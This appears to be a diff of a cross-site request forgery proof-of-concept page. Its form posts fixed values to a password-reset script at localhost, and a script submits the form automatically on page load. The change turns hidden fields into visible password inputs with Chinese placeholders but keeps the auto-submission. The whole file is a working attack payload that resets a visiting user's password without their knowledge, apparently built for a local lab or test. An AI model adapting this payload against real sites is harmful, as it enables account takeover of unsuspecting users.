@@ -2,9 +2,10 @@
   <body>
 <form method="post"  action="http://localhost:80/reset.php">
 
-		 <input name="newpassword"  type="hidden" value="123456" />
-        <input name="repeatpassword" type="hidden"  value="123456" />
-		 <input name="Submit" type="hidden"  value="Login" />
+<input name="newpassword" type="password" id="newPassword" class="form-control" placeholder="输入新密码" value="12345" required autofocus>
+        <input name="repeatpassword" type="password" id="repeatPassword" class="form-control" placeholder="确认新密码" value="12345" required>
+        
+        <button name="Submit" value="Login" class="btn btn-lg btn-primary btn-block" type="submit">重置</button>
 </form>
 <script>
 	document.forms[0].submit();
